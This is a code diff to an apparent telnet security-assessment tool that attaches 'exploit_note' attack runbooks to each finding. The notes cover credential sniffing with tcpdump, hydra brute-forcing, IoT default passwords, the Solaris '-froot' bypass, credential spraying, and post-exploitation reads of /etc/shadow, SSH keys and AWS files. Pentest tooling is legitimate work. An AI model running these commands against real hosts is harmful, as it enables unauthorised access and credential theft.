@@ -787,7 +787,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 "Disable telnetd; require SSH with key auth. Remove the "
                 "telnet client from operator paths so muscle-memory does not "
                 "recreate the exposure.", ["CWE-319", "CWE-311"],
-                kind="telnet_present"))
+                kind="telnet_present",
+                exploit_note=(
+                    "tcpdump -i <iface> -A 's tcp port 23 and host IP' on the "
+                    "segment; any operator login leaks creds."),
+                depth_tier="t0"))
 
             if not pr:
                 continue
@@ -845,7 +849,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Disable the NEW-ENVIRON option on the telnetd (or remove "
                     "telnet entirely); at minimum blank USER/HOME/DISPLAY from "
                     "the server-side environment login sees.",
-                    ["CWE-200", "CWE-201"], kind="telnet_environ_leak"))
+                    ["CWE-200", "CWE-201"], kind="telnet_environ_leak",
+                    exploit_note=(
+                        "hydra -L leaked_users.txt -P rockyou.txt telnet://IP:23 "
+                        "-t 4 -f -w 5 ; also try ssh://IP with same list."),
+                    depth_tier="t2"))
 
             # 5) vendor fingerprint (when we have a concrete guess)
             if pr.get("vendor") and pr["vendor"] != "unknown":
@@ -858,7 +866,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "telnet", f"telnet {h.ip} {p.portid}",
                     "N/A — feeds the vendor-specific runbook (default creds, "
                     "known CVEs, identity commands).",
-                    ["CWE-200"], kind="telnet_vendor_fingerprint"))
+                    ["CWE-200"], kind="telnet_vendor_fingerprint",
+                    exploit_note=(
+                        "telnet IP 23 -- read banner ; consult vendor default-cred "
+                        "sheet ; try appropriate defaults with active_attacks=True"),
+                    depth_tier="t0"))
 
             # 6) known-bad build map
             for rx, (sev, title, detail, cwes, kind, cmd) in _KNOWN_BAD:
@@ -869,7 +881,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "metasploit / manual", cmd,
                         "Upgrade to a vendor-clean, current build; the current "
                         "one is compromised/vulnerable. Rotate every "
-                        "credential the host held.", cwes, kind=kind))
+                        "credential the host held.", cwes, kind=kind,
+                        exploit_note=(
+                            "For SunOS 5.10: telnet -l -froot IP ; for BusyBox/"
+                            "embedded: try root:xc3511, root:vizxv, root:root; "
+                            "for netkit CVE-2020-10188: search github for "
+                            "encrypt_keyid PoC."),
+                        depth_tier="t0"))
                     break
 
             # 7) NTLM AV_PAIR
@@ -886,7 +904,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Disable telnet on Windows (Turn Off Telnet Server), or "
                     "at minimum disable the AUTHENTICATION option so NTLM is "
                     "not offered pre-auth.", ["CWE-200"],
-                    kind="telnet_ntlm_info_leak"))
+                    kind="telnet_ntlm_info_leak",
+                    exploit_note=(
+                        "kerbrute userenum -d <dns_domain> --dc <dns_computer> "
+                        "users.txt ; impacket-lookupsid <user>@<dns_computer> "
+                        "-no-pass"),
+                    depth_tier="t2"))
 
             # 8) telnets-over-TLS
             if pr.get("tls"):
@@ -921,7 +944,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 f"and host {h.ip}'",
                 "Segment management traffic onto a dedicated OOB network; "
                 "replace telnet with SSH end-to-end.",
-                ["CWE-319", "CWE-311"], kind="telnet_sniff_runbook"))
+                ["CWE-319", "CWE-311"], kind="telnet_sniff_runbook",
+                exploit_note=(
+                    "tcpdump -i any -A -s0 'tcp port 23 and host IP' ; "
+                    "strings capture.pcap | grep -i -E 'user|pass|login'"),
+                depth_tier="t0"))
 
             # 11) default-cred hits (only present when the gated sweep ran and
             # something actually authenticated)
@@ -938,7 +965,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "entirely. Spray the same pair against SSH/HTTP-admin/"
                     "SNMP/FTP on this host and the segment — embedded "
                     "devices share creds ruthlessly.",
-                    ["CWE-798", "CWE-521"], kind="telnet_default_creds"))
+                    ["CWE-798", "CWE-521"], kind="telnet_default_creds",
+                    exploit_note=(
+                        "hydra -l <user> -p <pass> ssh://IP,http-get://IP/,"
+                        "snmp://IP,ftp://IP ; on device: 'show running-config | "
+                        "inc snmp|enable secret|username' (Cisco) or wget backup"),
+                    depth_tier="t3"))
 
             # 12) Solaris -f bypass hit
             solaris = pr.get("solaris_dashf") or {}
@@ -953,7 +985,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "telnet", f"telnet -l -froot {h.ip}",
                     "Patch to a Solaris 10 build with the CVE-2007-0882 fix, "
                     "or replace with SSH.", ["CWE-88", "CWE-287"],
-                    kind="telnet_solaris_dashf_rce"))
+                    kind="telnet_solaris_dashf_rce",
+                    exploit_note=(
+                        "telnet -l -froot IP ; then: uname -a; id; cat /etc/"
+                        "shadow; find / -name id_rsa -o -name .aws 2>/dev/null; "
+                        "cp /var/adm/messages loot/"),
+                    depth_tier="t3"))
 
             # 13) credentialed shell (if the caller supplied captures)
             for cap in pr.get("cred_captures") or []:
@@ -965,7 +1002,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "telnet", f"telnet -l {cap.get('user','<user>')} {h.ip} "
                     f"{p.portid}",
                     "N/A — foothold; feeds known_users/known_hostnames.",
-                    ["CWE-522"], kind="telnet_credentialed_shell"))
+                    ["CWE-522"], kind="telnet_credentialed_shell",
+                    exploit_note=(
+                        "After telnet_default_creds hit: telnet -l <user> IP + "
+                        "send: id; uname -a; hostname; cat /etc/passwd -- feed "
+                        "output into known_users."),
+                    depth_tier="t3"))
 
             # 14) timing user-enum results
             valid_timing = [r for r in (pr.get("timing_enum") or [])
